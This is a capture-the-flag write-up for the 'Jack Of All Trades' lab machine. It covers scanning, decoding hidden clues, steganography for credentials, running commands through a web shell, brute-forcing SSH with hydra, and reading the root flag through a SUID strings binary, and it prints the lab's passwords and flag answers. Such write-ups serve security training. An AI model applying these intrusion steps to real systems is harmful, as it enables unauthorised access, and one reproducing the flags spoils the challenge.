> Jack Of All Trades | Boot2Root

**export IP=10.10.217.6**

# Nmap

nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
22/tcp open  http    syn-ack Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Jack-of-all-trades!
80/tcp open  ssh     syn-ack OpenSSH 6.7p1 Debian 5 (protocol 2.0)
```

**NOTE : To overcome the port errot in `about:config` create an entry `network.security.ports.banned.override` and set the value `22`**

# Gobuster

gobuster -u http://10.10.217.6:22 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 20 -o gobuster/initial -x .php

```
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.hta (Status: 403)
/.hta.php (Status: 403)
/assets (Status: 301)
/index.html (Status: 200)
/recovery.php (Status: 200)
/server-status (Status: 403)
```

curl http://$IP:22 gives us a base64 strings

echo "UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==" | base64 -d


```
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

**NOTE : If I ever get locked out I can get back in at /recovery.php!**

In /recovery.php we found

`GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=`

base32 -> hex -> rot13

```
Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```

The above link gives us an hint about Stegosauria like stego

Using stegsolve and password we already have `u?WtKSraq`
We got creds.txt

```
Hehe. Gotcha!

You're on the right path, but wrong image!
```

We must get the top image and stegide and extract with the same password header.jpg

```
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
```

This page asks for commands and let's give it

http://10.10.217.6:22/nnxhweOV/index.php?cmd=ls -la /home

```
total 16
drwxr-xr-x  3 root root 4096 Feb 29  2020 .
drwxr-xr-x 23 root root 4096 Feb 29  2020 ..
drwxr-x---  3 jack jack 4096 Feb 29  2020 jack
-rw-r--r--  1 root root  408 Feb 29  2020 jacks_password_list
-rw-r--r--  1 root root  408 Feb 29  2020 jacks_password_list
```

We got the password list.

# Cracking SSH using Hydra

hydra -l jack -P password_list.txt -s 80 ssh://10.10.217.6

```
[80][ssh] host: 10.10.217.6   login: jack   password: ITMJpGGIqg1jn?>@
```

We got a user.jpg file and on moving it to our local machine we have it.

user.txt
================================
securt-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}
================================

# SUID binaries

find / -perm -u=s -type f 2>/dev/null

```
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/strings
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/procmail
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su
```

/usr/bin/strings /root/root.txt

```
securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
```